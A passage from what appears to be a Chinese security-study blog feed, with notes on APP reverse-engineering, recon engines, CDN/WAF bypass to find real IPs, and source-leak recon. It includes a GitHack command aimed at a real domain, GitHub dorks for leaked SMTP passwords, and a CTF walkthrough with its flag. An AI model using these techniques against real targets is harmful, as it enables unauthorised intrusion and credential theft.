class="code"><pre><span class="line">docker start id   <span class="comment"># 启动容器</span></span><br><span class="line">docker restart id <span class="comment"># 重启容器</span></span><br><span class="line">docker stop id    <span class="comment"># 停止当前正在运行的容器</span></span><br><span class="line">docker kill id    <span class="comment"># 强制停止当前容器</span></span><br></pre></td></tr></table></figure><h1 id="常用其它命令（重要）"><a href="#常用其它命令（重要）" class="headerlink" title="常用其它命令（重要）"></a>常用其它命令（重要）</h1><h2 id="后台启动"><a href="#后台启动" class="headerlink" title="后台启动"></a>后台启动</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost docker]# </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令docker run -d 镜像名</span></span><br><span class="line">[root@localhost docker]# docker run -d centos</span><br><span class="line">2c41b7d4115cd2bc9e71a9d1d9a8a341da89fa275cc27541ca7012b75c7ba4c1</span><br><span class="line">[root@localhost docker]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台启动，发现没有前台进程，直接被杀掉了</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker技术学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0007-小程序/APP安全-红队工具</title>
      <link href="/2023/05/01/SEC-Study-0035/"/>
      <url>/2023/05/01/SEC-Study-0035/</url>
      
        <content type="html"><![CDATA[<p>小程序及APP安全概述</p><hr><span id="more"></span><h1 id="小程序-APP安全-内-外安全"><a href="#小程序-APP安全-内-外安全" class="headerlink" title="小程序/APP安全-内/外安全"></a>小程序/APP安全-内/外安全</h1><h2 id="内安全"><a href="#内安全" class="headerlink" title="内安全"></a>内安全</h2><p>个人理解：源代码本地调试，属于白盒测试的一类。</p><p>APP/安卓源码安全大体测试步骤如下：</p><blockquote><ol><li>源代码提取</li><li>功能逻辑与源代分析出关键信息</li><li>抓取关键信息资产，例如ICO，MD5值</li><li>借助黑暗引擎对资产信息进行二次搜索，例如使用ICO进行搜索，查出相关网络站点。</li><li>找到站点信息，结合源码进行安全测试</li></ol><p>总结：反编译出源代码，对源代码进行代码审计，获取重要资产信息，包括RES等。</p></blockquote><p>相关工具及功能：</p><blockquote><p>app内在提取-<a href="https://github.com/kelvinBen/AppInfoScanner">AppInfoScanner</a><br>反编译出源代码，在源代码中寻找漏洞，信息收集采集。对源代码进行分析。</p><p>查壳工具：ApkScan-PKID<br>如果有壳存在，需要脱壳后再进行扫描。使用Xp框架(安卓逆向)去壳<br>如果安卓软件找不到apk安卓包==&gt; apk提取工具(提取方式多种多样)</p><p>资源提取类别：安装包&amp;资源文件<br>安装包，图片，xml配置文件等</p></blockquote><h2 id="外安全"><a href="#外安全" class="headerlink" title="外安全"></a>外安全</h2><p>个人理解：黑盒测试，无法看到源代码，但可以使用抓包调试进行分析</p><p>调用工具：使用茶杯、BP、FD等结合使用，结合手机模拟器进行抓包调试。==&gt; 抓包调试属于Web网站测试的范畴。</p><p>注意：有的软件是反调试的，它会直接截断相关操作。==&gt;程序带壳。</p><p>解决办法：使用去壳工具对安卓应用去壳处理，还有将应用使用特定软件将其从安卓手机当做提取出来。当然，提取的办法多种多样，QQ互传也能提取app。</p><h2 id="壳安全-安全加固"><a href="#壳安全-安全加固" class="headerlink" title="壳安全-安全加固"></a>壳安全-安全加固</h2><p>个人理解：锁。防止web截取的锁，类似于token那种的。</p><p>涉及到的框架有：XP框架，frida(Xposed&amp;JustTrustMe)等。</p><p>功能：壳安全，指给应用加防护，防止应用被非法调试。</p><h2 id="综合测试"><a href="#综合测试" class="headerlink" title="综合测试"></a>综合测试</h2><p>外安全和内安全、加壳安全不是相对独立的。一般可以：</p><blockquote><p>去壳重新封装 ==&gt; 源代码测试(源代码资产信息)==&gt;结合抓包软件实时调试==&gt;根据实时调试获取重要资产信息==&gt;结合代码功能逻辑和功能展示，对源代码进行篡改，得到付费功能等。</p></blockquote><p>总体上来讲，无论是外在内在还是去壳，目标只有一个：获取资产信息，完成对目标的资产信息收集。</p><blockquote><p>深入：安卓逆向，app逆向。<br>安全测试：代码逻辑，本身代码与抓包分析和UI上的分析相结合。(java代码审计，PHP代码审计)</p></blockquote><h1 id="红队工具篇"><a href="#红队工具篇" class="headerlink" title="红队工具篇"></a>红队工具篇</h1><h2 id="黑暗引擎："><a href="#黑暗引擎：" class="headerlink" title="黑暗引擎："></a>黑暗引擎：</h2><p>网络空间支持搜索资产信息。</p><p>批量挖漏洞，批量挖SRC，批量测试漏洞。</p><blockquote><p>1、网络空间四大引擎-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye<br><a href="https://fofa.info/">https://fofa.info</a> ==&gt; 比较好使，常用<br><a href="https://quake.360.cn/">https://quake.360.cn</a> ==&gt; 常用<br><a href="https://www.shodan.io/">https://www.shodan.io</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p></blockquote><p>批量测试的由来</p><blockquote><p>搜索信息：关联资产，特征资产(网络空间相关语法搜索资产)，资产信息<br>可以使用特征资产搜索出对应的带有相同漏洞的资产，再进行批量测试，最后进行批量提交漏洞。</p></blockquote><h2 id="自动项目"><a href="#自动项目" class="headerlink" title="自动项目"></a>自动项目</h2><blockquote><p>2、自动化信息收集项目-ARL灯塔&amp;Suize水泽&amp;Kunyu坤舆<br><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a><br><a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a><br><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>总结：批量化的测试工具集成了功能，但将功能单一独立出来与单点功能的软件进行比较，有些不如单点好。综上所述，使用什么工具视情况而定。</p></blockquote><h2 id="相关资源："><a href="#相关资源：" class="headerlink" title="相关资源："></a>相关资源：</h2><blockquote><p>3、单点功能信息收集项目-企查&amp;子域名&amp;指纹识别&amp;社工信息<br><a href="https://forum.ywhack.com/center.php">https://forum.ywhack.com/center.php</a></p></blockquote><p>➢网络空间-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye<br>➢工具测评-网络空间-四大黑暗引擎集合版项目<br>➢工具测评-自动化收集-ARL灯塔&amp;Suize水泽&amp;Kunyu<br>➢工具测评-单点功能器-企查&amp;子域名&amp;指纹识别&amp;社工</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-信息打点-02 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0006-防护手段识别(CDN/WAF/负载均衡)-CDN原理/绕过</title>
      <link href="/2023/04/29/SEC-Study-0034/"/>
      <url>/2023/04/29/SEC-Study-0034/</url>
      
        <content type="html"><![CDATA[<p>防护手段识别(CDN/WAF/负载均衡)-CDN原理/绕过</p><span id="more"></span><h1 id="防护信息收集-厂商防护-WAF-系统防护"><a href="#防护信息收集-厂商防护-WAF-系统防护" class="headerlink" title="防护信息收集-厂商防护/WAF/系统防护"></a>防护信息收集-厂商防护/WAF/系统防护</h1><h2 id="获取网络信息-服务厂商-amp-网络架构"><a href="#获取网络信息-服务厂商-amp-网络架构" class="headerlink" title="获取网络信息-服务厂商&amp;网络架构"></a>获取网络信息-服务厂商&amp;网络架构</h2><p>服务厂商:</p><blockquote><p>国内大厂商：腾讯云，阿里云等。<br>服务器环境：厂商机房，或者自购的服务器及搭建机房。<br>大部分是租用服务器的。<br><strong>目的：</strong> 借此了解到目标的 <strong>防护等级，拦截的尺度，知晓测试的难度</strong> 。厂商自己的防护会自动帮助部署在其上面的服务器进行保护。防护过高直接跑路。</p></blockquote><p>网络架构：</p><ul><li>传统：C/S结构，即客户端-服务器</li><li>三层架构：客户端，应用服务器，数据库服务器</li><li>MVC架构：通过MVC这种架构将应用程序分成模型（Model）、视图（View）和控制器（Controller）三个部分，实现了业务逻辑层、表示层和数据源区分。</li><li>SOA架构：这种架构将应用程序看作一系列可重用的服务，利用服务调用和消息传递等机制进行通信与整合。</li></ul><h2 id="获取服务信息-应用协议-amp-内网资产"><a href="#获取服务信息-应用协议-amp-内网资产" class="headerlink" title="获取服务信息-应用协议&amp;内网资产"></a>获取服务信息-应用协议&amp;内网资产</h2><p>网站IP地址映射：从外网IP映射到内网IP，也就是将外网的访问流量移交到内网的指定IP上。<br>外网的扫描：扫描的对象时外网的接口，而不是内网。探针到外网IP地址，实际上提供服务的是内网IP地址。</p><p>应用协议：</p><blockquote><p>协议有很多，例如：FTP，ssh，redis各种各样的服务<br>安全测试：协议漏洞</p></blockquote><p>获取内网资产信息：</p><blockquote><p>获取同一个IP地址下的同网段下的所有IP地址以及资产信息。<br>目标：1.1.1.3<br>网段：1.1.1.1~1.1.1.255<br>拿下一个网络段对应的一台服务器后进行内网渗透。</p></blockquote><p>内网和外网隔离时对服务器进行探针：扫不到，误报。</p><h2 id="获取阻碍信息-CDN-amp-WAF-amp-负载-amp-防火墙"><a href="#获取阻碍信息-CDN-amp-WAF-amp-负载-amp-防火墙" class="headerlink" title="获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙"></a>获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</h2><p>有一些本身不是为了做防护的，但对安全测试有一定的影响，所以它们是阻碍。</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">CDN（内容分发网络）</span><br><span class="line">    - 概念：是一个由多个服务器组成的网络，目的是提高网站的访问速度、可靠性和安全性。CDN会将内容分发到离用户最近的服务器上，缩短从服务器到用户之间的距离，加快用户访问速度。</span><br><span class="line">    - 个人理解：内容分发服务器，加速各个地区访问该站点的速度，将主站的内容缓存到其他站点。</span><br><span class="line">    带来的问题：超级Ping对指定地址ping时会出现多地址的情况，没有单一的指向一个IP地址或者地区。</span><br><span class="line"></span><br><span class="line">WAF（Web应用程序防火墙）</span><br><span class="line">    - 概念：是一种网络安全解决方案，用于过滤和监控Web应用程序与互联网之间的HTTP流量，保护Web应用程序免受诸如XSS、SQL注入等攻击。WAF采用七层防御策略，能够检测和拦截应用层协议的恶意流量。</span><br><span class="line">    - 个人理解：这里的WAF特指Web防护</span><br><span class="line">    - 识别方法：</span><br><span class="line">        - 看图识别：防火墙提示信息的图片进行识别</span><br><span class="line">        - 使用<span class="keyword">nmap</span>，messcan等工具进行识别</span><br><span class="line">    - 能不能绕过：</span><br><span class="line">        - 一般的WAF无法绕过，遇到大公司的WAF直接跑路</span><br><span class="line">        - 可以绕过的WAF为那些开源的WAF，小WAF等。例如安全狗。</span><br><span class="line"></span><br><span class="line">负载均衡</span><br><span class="line">    - 概念：是一种将网络请求分摊到多个计算机或网络资源上的技术，以提高系统的可伸缩性、可靠性和吞吐量。负载均衡可以基于四层和七层进行负载均衡，四层主要通过修改数据包的地址信息将流量转发到应用服务器上，而七层则可以基于应用层协议进行负载均衡。</span><br><span class="line">    - 个人理解：</span><br><span class="line"></span><br><span class="line">防火墙</span><br><span class="line">    - 概念：是一种网络安全设备，用于保护计算机和网络免受未经授权的访问、攻击和数据泄漏。防火墙可以对网络流量进行过滤、监控和阻止，以保护网络免受恶意攻击和威胁。</span><br><span class="line">    - 个人理解：这里的防火墙特指系统自带防火墙和硬件防火墙。</span><br><span class="line">    - 应用点：防火墙识别一般在于内网，外网防火墙意义不大(无法测试)。<span class="keyword">nmap</span>也能识别，但只能识别默认防火墙，不能识别硬件防火墙。</span><br><span class="line"></span><br><span class="line">为什么说拿到一个内网网段权限后，就能针对内网网段进行内网测试：</span><br><span class="line">    - 内网服务器一台被拿下后，相当于拿下了对应的内网环境的一个ip，使用这个ip在内网时</span><br><span class="line">    - 它们是属于同一个局域网的。</span><br></pre></td></tr></table></figure><h2 id="防护识别工具"><a href="#防护识别工具" class="headerlink" title="防护识别工具"></a>防护识别工具</h2><h3 id="相关利用项目"><a href="#相关利用项目" class="headerlink" title="相关利用项目"></a>相关利用项目</h3><p>Kali上自带Nmap，Masscan，lbd等项目。</p><blockquote><p><a href="ping.chinaz.com">超级ping</a>：CDN服务识别<br><a href="https://github.com/robertdavidgraham/masscan">Masscan</a>：端口扫描，应用协议，速度相对较快<br><a href="https://github.com/EnableSecurity/wafw00f">Wafw00f</a>：Web应用防护防火墙识别<br>Nmap：端口扫描，应用协议，防火墙识别<br>lbd：负载均衡，广域网负载均衡，应用层负载均衡 –&gt; 拿下帮他打工的服务器–没用 提供优质服务，防累积</p></blockquote><h3 id="端口协议安全-旁注-C段"><a href="#端口协议安全-旁注-C段" class="headerlink" title="端口协议安全/旁注/C段"></a>端口协议安全/旁注/C段</h3><p>每个端口提供的服务不一样，端口协议不尽相同。端口协议的安全参照这篇<a href="https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/">博客</a></p><p>旁注：同服务器下面的不同WEB应用查询技术<br>从主站的URL上找不到突破口，于是从旁站，也就是同一个服务器下的其他URL站点寻找突破口。也就是这个主站相关的域名注册了其他的站点，可以从其他站点寻找突破口。内网同一个网络段下的所有IP地址所涉及的协议服务也可以。</p><p>C段：同网段下面的不同服务器IP下的WEB应用查询技术。查询的是整段。</p><h1 id="CDN-原理-配置-绕过-绑定"><a href="#CDN-原理-配置-绕过-绑定" class="headerlink" title="CDN-原理/配置/绕过/绑定"></a>CDN-原理/配置/绕过/绑定</h1><h2 id="CDN知识-工作原理及阻碍"><a href="#CDN知识-工作原理及阻碍" class="headerlink" title="CDN知识-工作原理及阻碍"></a>CDN知识-工作原理及阻碍</h2><p>原理：内容分发服务器，提高用户的访问速度，就近获取服务。<br>阻碍：访问的是节点服务器，而不是主机源码服务器。<br>1.传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机<br>2.普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机<br>3.带WAF的CDN：用户访问域名–&gt;CDN节点（WAF）–&gt;真实服务器IP–&gt;访问目标主机</p><h2 id="CDN配置-域名-amp-区域-amp-类型"><a href="#CDN配置-域名-amp-区域-amp-类型" class="headerlink" title="CDN配置-域名&amp;区域&amp;类型"></a>CDN配置-域名&amp;区域&amp;类型</h2><p>配置1：加速域名-需要启用加速的域名，可以使用“*”配置全部域名加速<br>配置2：加速区域-需要启用加速的地区，国内/国外/全球<br>配置3：加速类型-需要启用加速的资源，可以单独选择配置图片加速，脚本加速，视频加速，或者全局加速。</p><h2 id="CDN绕过-靠谱十余种技战法-获取真实IP地址的办法"><a href="#CDN绕过-靠谱十余种技战法-获取真实IP地址的办法" class="headerlink" title="CDN绕过-靠谱十余种技战法-获取真实IP地址的办法"></a>CDN绕过-靠谱十余种技战法-获取真实IP地址的办法</h2><p>资料：<br><a href="https://zhuanlan.zhihu.com/p/33440472">CDN绕过1</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">CDN绕过2</a></p><ol><li><p>子域名加速：子域名和主站如果是同一IP的，主站加速但子站未加速，就能借子站获取主站的真实IP地址。<br>➢真实应用-CDN绕过-子域名查询操作</p></li><li><p>网站漏洞：例如让目标网站自己ping测试主机，从测试主机获得IP地址。<br>➢真实应用-CDN绕过-漏洞&amp;遗留文件-涉及正反向<br>phpinfo.php ：重要配置文件，会泄露服务器本身的地址。如果是内网地址就泄露内网地址，没内网网卡就泄露真实ip</p></li><li><p>历史DNS缓存：通过历史设置的DNS找到真实IP</p></li><li><p>账号密码社工：社工到服务器的账号，直接得到真实IP</p></li><li><p>国外请求：利用加速区域不是全球进行绕过。只加速一部分区域会造成部分地区出现真实IP的情况。<br>➢真实应用-CDN绕过-接口查询国外访问<br>CDN记录基本上做不了什么事情。</p></li><li><p>fofa网络空间搜索大法：通过网站特殊文件信息得到信息（业务类型不是全站加速，有图片之类的没加速导致部分小部件泄露真实IP）</p></li><li><p>邮箱暴露<br>➢真实应用-CDN绕过-主动邮件配合备案<br>让邮箱主动发送邮件，借查看原邮件暴露真实的IP地址。如果邮件被中间邮箱拦截，可以自己搭建邮箱服务器接收邮件。<br>利用邮件接口没加速</p></li><li><p>全网扫描<br>让目标主机主动访问你设置的资源，你设置的资源就能获取目标服务器过来访问的真实IP地址。<br>可以使用纯真IP直接扫真实IP，但不一定正确，需要多方面佐证。<br>➢真实应用-CDN绕过-全网扫描FuckCDN</p></li></ol><blockquote><p>服务越多钱越贵，所以只加速一部分而不是全局加速。<br>子域名，去掉www，邮件服务器，国外访问，证书查询，APP抓包<br>黑暗空间引擎，通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p></blockquote><h2 id="CDN绑定-HOSTS绑定指向访问"><a href="#CDN绑定-HOSTS绑定指向访问" class="headerlink" title="CDN绑定-HOSTS绑定指向访问"></a>CDN绑定-HOSTS绑定指向访问</h2><blockquote><p><a href="http://17ce.com/">各地ping</a>，备案查询等多方面佐证，确认无误后，使用hosts绑定到真实IP地址，确保后期安全测试能正常进行。不能访问就是找错了。</p></blockquote><h2 id="CDN判定标准"><a href="#CDN判定标准" class="headerlink" title="CDN判定标准"></a>CDN判定标准</h2><p>nslookup,各地ping（出现多个IP即启用CDN服务）</p><h1 id="案例资源："><a href="#案例资源：" class="headerlink" title="案例资源："></a>案例资源：</h1><p>超级Ping：<a href="https://www.17ce.com/">https://www.17ce.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-信息打点-02 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0005-[源码识别/获取-黑白盒-端口扫描-资产识别]</title>
      <link href="/2023/04/27/SEC-Study-0033/"/>
      <url>/2023/04/27/SEC-Study-0033/</url>
      
        <content type="html"><![CDATA[<p>信息收集</p><h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等<br>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等<br>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他等<br>4、打点-Web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p><h1 id="CMS源码★★★"><a href="#CMS源码★★★" class="headerlink" title="CMS源码★★★"></a>CMS源码★★★</h1><h2 id="分类及概念"><a href="#分类及概念" class="headerlink" title="分类及概念"></a>分类及概念</h2><p>源码分类主要分为两大类： <strong>开源代码和闭源代码</strong> 。</p><p>程序源码–获取有价值的源码类信息，追查出其他漏洞，弱口令等……<br>资源监控：GitHub监控，gitee监控等，防止源码泄露到GitHub等资源平台去。</p><p>CMS渗透安全思路：</p><blockquote><p>通过已知的CMS查对应的漏洞库。<br>可以通过网站类型和应用区别和寻找CMS。<br>后期攻击非常的重要，针对源码进行测试和漏洞的挖掘。<br>通过插件获取CMS<br>通过源码泄露(备份文件,配置文件)获取CMS或者 <strong>未知的CMS/内部源码</strong></p></blockquote><h2 id="黑盒测试和白盒测试"><a href="#黑盒测试和白盒测试" class="headerlink" title="黑盒测试和白盒测试"></a>黑盒测试和白盒测试</h2><p>黑盒测试：没有源代码，对黑盒开放出来的功能进行测试<br>白盒测试：有源代码，对源代码进行代码审计并且挖漏洞。</p><h2 id="CMS源码收集"><a href="#CMS源码收集" class="headerlink" title="CMS源码收集"></a>CMS源码收集</h2><h3 id="获取途径"><a href="#获取途径" class="headerlink" title="获取途径"></a>获取途径</h3><p>从第二点开始是针对CMS识别不到的情况。例如灰色产业的。</p><ol><li>直接识别：<ol><li><a href="https://www.yunsee.cn/">云悉指纹识别(点击跳转)</a>：需要申请的，识别不是完全的（非大公司淘宝等系列，大公司没CMS）</li><li>GitHub <a href="https://github.com/Lucifer1993/cmsprint">CMS开源指纹识别库</a></li></ol></li><li>备份性文件：<ol><li>管理人员配置不当 =&gt; 产生备份文件</li><li>通过备份文件获取网站源码 =&gt; 识别到对应的CMS =&gt; 找对应CMS漏洞</li><li>网站敏感目录文件扫描，扫描其中的备份文件</li><li>例如：<a href="http://www.zip/">www.zip</a></li></ol></li><li>代码仓库云平台<ol><li>源码分享导致的源码泄露</li><li>需要使用各种各样的监控措施</li><li>敏感目录未删除导致的目录文件复原漏洞 =&gt; 恢复源码造成源码泄露<ol><li>.git：同步代码的一个隐藏目录，泄露时可能造成严重的网站源码泄露。目录存在时状态码为403</li><li>.svn/entries: 也是一个同步代码的隐藏目录</li><li>.DS_store: Mac环境的代码泄露</li></ol></li></ol></li><li>composer.json - PHP特性<ol><li>php文件的配置文件泄露</li><li>通过它获取源码版权配置信息插件等。</li><li>配置性说明性文件。</li></ol></li><li>Web-INF/web.xml泄露<ol><li>javaweb的安全目录</li><li>WEB-INF主要包含以下内容：</li><li>对应的一道CTF：BUUCTF-Easy Java<ol><li>使用url/Download+POST传参的filename=Web-INF/web.xml</li><li>使用web.xml当中的信息，使用url/Download+POST传参filename=WEB-INF/classes/com/wm/ctf/FlagController.class下载class文件</li><li>最后，使用010查出flag的base64编码值，解码后得到flag：flag{1564e8ba-476b-4b95-bdf6-a7764208688e}</li></ol></li><li>总体流程 ：配置文件，源码结构下载文件漏洞，得到目标</li><li>鸡肋：需要配合其他漏洞一起使用。<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：包含所有的 Servlet 类和其他类文件，类文件所在的目录结构与他们的包名称匹配。<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件。</li></ol></li></ol><h3 id="相关利用项目工具："><a href="#相关利用项目工具：" class="headerlink" title="相关利用项目工具："></a>相关利用项目工具：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CMS识别：</span><br><span class="line">备份：敏感目录文件扫描-<span class="number">7</span>kbscan-WebPathBrute</span><br><span class="line">CVS：https:<span class="comment">//github.com/kost/dvcs-ripper</span></span><br><span class="line"></span><br><span class="line">GIT：https:<span class="comment">//github.com/lijiejie/GitHack</span></span><br><span class="line">python GitHack.py http:<span class="comment">//www.openssl.org/.git/</span></span><br><span class="line"></span><br><span class="line">SVN：https:<span class="comment">//github.com/callmefeifei/SvnHack</span></span><br><span class="line">DS_Store：https:<span class="comment">//github.com/lijiejie/ds_store_exp</span></span><br></pre></td></tr></table></figure><h3 id="查询＆搜索-浏览器关键字搜索语法"><a href="#查询＆搜索-浏览器关键字搜索语法" class="headerlink" title="查询＆搜索-浏览器关键字搜索语法"></a>查询＆搜索-浏览器关键字搜索语法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以在这些码云平台搜索对应的开发者，说不定会找到他或他们团队的开发源码，也就间接的找到了网站源码</span><br><span class="line"></span><br><span class="line">GITHUB资源搜索：</span><br><span class="line">in:name test               <span class="comment">#仓库标题搜索含有关键字 </span></span><br><span class="line">in:desripton test          <span class="comment">#仓库描述搜索含有关键字 </span></span><br><span class="line">in:readme test             <span class="comment">#Readme文件搜素含有关键字 </span></span><br><span class="line">stars:&gt;<span class="number">3000</span> test           <span class="comment">#stars数量大于3000的搜索关键字 </span></span><br><span class="line">stars:<span class="number">1000</span>.<span class="number">.3000</span> test      <span class="comment">#stars数量大于1000小于3000的搜索关键字 forks:&gt;1000 test         #forks数量大于1000的搜索关键字 </span></span><br><span class="line">forks:<span class="number">1000</span>.<span class="number">.3000</span> test      <span class="comment">#forks数量大于1000小于3000的搜索关键字 size:&gt;=5000 test         #指定仓库大于5000k(5M)的搜索关键字 pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 created:&gt;2019-02-12 test    #创建时间大于2019-02-12的搜索关键字 user:test                  #用户名搜素 </span></span><br><span class="line">license:apache-<span class="number">2.0</span> test    <span class="comment">#明确仓库的 LICENSE 搜索关键字 language:java test              #在java语言的代码中搜索关键字 </span></span><br><span class="line">user:test in:name test     <span class="comment">#组合搜索,用户名test的标题含有test的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关键字配合谷歌搜索：</span><br><span class="line">site:Git4hub.com smtp   </span><br><span class="line">site:Github.com smtp @qq.com   </span><br><span class="line">site:Github.com smtp @<span class="number">126</span>.com   </span><br><span class="line">site:Github.com smtp @<span class="number">163</span>.com   </span><br><span class="line">site:Github.com smtp @sina.com.cn </span><br><span class="line">site:Github.com smtp password </span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure><h2 id="CMS种类"><a href="#CMS种类" class="headerlink" title="CMS种类"></a>CMS种类</h2><h3 id="闭源和开源"><a href="#闭源和开源" class="headerlink" title="闭源和开源"></a>闭源和开源</h3><h4 id="开源代码"><a href="#开源代码" class="headerlink" title="开源代码"></a>开源代码</h4><p>免费开源直接使用。</p><p><strong>开源代码</strong> 是指可以被 <strong>公开查看、使用、修改和分发</strong> 的计算机程序源代码。–&gt; 网上可以找到的。<br>通常包括一个许可证来规定其使用条款。开源软件通常被认为是一种共同创造的成果，能够充分利用社区的智力和经验积累，具有更高的灵活性、可靠性和安全性，也能够促进创新和技术进步。常见的开源许可证有 GPL、MIT、Apache 等。</p><h4 id="闭源代码"><a href="#闭源代码" class="headerlink" title="闭源代码"></a>闭源代码</h4><p>不开源，内部工具软件等，或者自主研发程序（大网站）。</p><p><strong>闭源代码</strong> 是指 <strong>不能公开查看、使用、修改和分发</strong> 的计算机程序源代码，只能获取到二进制版本的程序，因此无法获得程序内部的工作原理和逻辑，难以进行二次开发和优化。</p><blockquote><p>有闭源售卖和自主研发的。</p></blockquote><p>闭源软件通常 <strong>需要支付授权费用</strong> 才能使用，在 <strong>商业应用</strong> 上较为 <strong>常见</strong> 。闭源代码又称为私有代码。</p><h3 id="其他分类方式"><a href="#其他分类方式" class="headerlink" title="其他分类方式"></a>其他分类方式</h3><p>除了开源和闭源之外，还有一些其他的源码分类：</p><pre><code>共享源码：共享源码是指允许在特定条件下使用源代码的模式，通常要求回报共享者的收益和进一步的贡献。对称源码：对称源码是指同一软件同时具有对于源码和二进制的授权，即允许用户自由地查看、复制、修改和分发源代码和二进制程序。透明源码：透明源码是指所有软件的源代码都是公开的，没有任何形式的加密和保密措施。</code></pre><h3 id="黑X源码来源："><a href="#黑X源码来源：" class="headerlink" title="黑X源码来源："></a>黑X源码来源：</h3><p>浏览器关键字搜索，例如直接搜索棋牌源码，护站网，约会源码等。<br>最好在必应和谷歌上去搜索，带有些词汇。或者网络空间搜索约会源码等。<br>源码有黑白，即：“黑有黑道，白有白道”</p><h1 id="重要信息收集"><a href="#重要信息收集" class="headerlink" title="重要信息收集"></a>重要信息收集</h1><h2 id="收集信息点："><a href="#收集信息点：" class="headerlink" title="收集信息点："></a>收集信息点：</h2><table><thead><tr><th>基础信息</th><th>系统信息</th><th>应用信息</th><th>防护信息</th><th>人员信息</th><th>其他信息等</th></tr></thead><tbody><tr><td>基本搭建的组合信息</td><td>操作系统支持服务器</td><td>安装的应用信息</td><td>安全防护信息+阻碍测试的信息</td><td>社工类管理员的信息+人的信息泄露</td><td>企业查询等</td></tr></tbody></table><h2 id="对应技术点-概览-资产识别："><a href="#对应技术点-概览-资产识别：" class="headerlink" title="对应技术点-概览-资产识别："></a>对应技术点-概览-资产识别：</h2><p>CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等</p><h2 id="系统笼统辨别点-架构类"><a href="#系统笼统辨别点-架构类" class="headerlink" title="系统笼统辨别点-架构类"></a>系统笼统辨别点-架构类</h2><h3 id="CMD式"><a href="#CMD式" class="headerlink" title="CMD式"></a>CMD式</h3><p>改index.php -&gt; index.phP    假设排除中间件的元素，那么就是系统问题。Windows系统默认大小写不敏感，而Linux默认大小写敏感。这是在赌运气。</p><h3 id="TTL值辨别点"><a href="#TTL值辨别点" class="headerlink" title="TTL值辨别点"></a>TTL值辨别点</h3><p>TTL值离哪个近就是那个系统</p><p>各个系统的TTL值：</p><p>Linux：64 255<br>Windows NT/2000/XP： 128<br>Windows 98 ： 32<br>Unix ： 255</p><h2 id="数据库默认端口号-架构类"><a href="#数据库默认端口号-架构类" class="headerlink" title="数据库默认端口号-架构类"></a>数据库默认端口号-架构类</h2><p>数据库判定：由搭建组合或端口扫描进行判定。例如通过搭建的脚本语言php判断mysql为与其组合的数据库。</p><p>常见的数据库，默认端口号是多少:</p><p>一、关系型数据库</p><blockquote><p>1、MySql数据库 ，默认端口是: 3306；<br>2、Oracle数据库 ，默认端口号为：1521；<br>3、Sql Server数据库 ，默认端口号为：1433；<br>4、DB2数据库， 默认端口号为：5000；<br>5、PostgreSQL数据库， 默认端口号为：5432；<br>6、国产的DM达梦数据库， 默认端口号为：5236。</p></blockquote><p>二、NoSql数据库（非关系型数据库）：</p><blockquote><p>1.Redis数据库，默认端口号：6379；<br>2.Memcached数据库，默认端口号：11211 ；<br>3.MongoDB数据库，默认端口号：27017；</p></blockquote><h2 id="端口扫描，探针-主动，被动"><a href="#端口扫描，探针-主动，被动" class="headerlink" 